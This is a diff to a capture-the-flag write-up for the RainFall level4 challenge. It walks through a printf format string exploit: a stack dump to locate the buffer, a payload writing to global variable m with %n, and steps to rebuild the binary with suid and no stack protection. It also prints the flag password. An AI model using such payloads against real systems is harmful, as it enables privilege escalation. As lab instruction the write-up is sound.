@@ -51,8 +51,7 @@ Let's use the printf() format string exploit to change the value of variable ```
 
 First let's print the stack to find the address of the variable we wish to modify.
 ```
-level4@RainFall:~$ python -c 'print "BBBB" + " %x" * 13' > /tmp/fmt_str
-level4@RainFall:~$ cat /tmp/fmt_str | ./level4
+level4@RainFall:~$ (python -c 'print "BBBB" + " %x" * 13' ; cat -) | ./level4
 BBBB b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 42424242 20782520
 ```
 We find buffer BBBB (42424242) in 12th position.
@@ -64,13 +63,28 @@ So we build our format string exploit:
 1. Address of glabal variable ```m``` (4 bytes)          - "\x10\x98\x04\x08"
 2. 16930112 bytes padding using ```%d```                 - "%16930112d"
 3. store n bytes printed in 12th argument with ```%n```  - "%12$n"
+
+When we feed our format string attack to the binary it opens a shell and shows us the level5 password.
 ```
-level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/level4_exploit
-```
-When we feed this to the binary it opens a shell and shows us the level5 password
-```
-level4@RainFall:~$ cat /tmp/level4_exploit | ./level4
+level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | ./level4
 ...
                      -1208015184
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+## Recreate Exploited Binary
+
+As user level5, in /tmp, create and compile level4_source.c.
+```
+level5@RainFall:/tmp$ gcc level4_source.c -fno-stack-protector -o level4_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level5@RainFall:/tmp$ chmod u+s level4_source; chmod +wx ~; mv level4_source ~
+```
+Exit back to user level4, then run the binary.
+```
+level5@RainFall:/tmp$ exit
+exit
+level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | /home/user/level5/level4_source
 ```
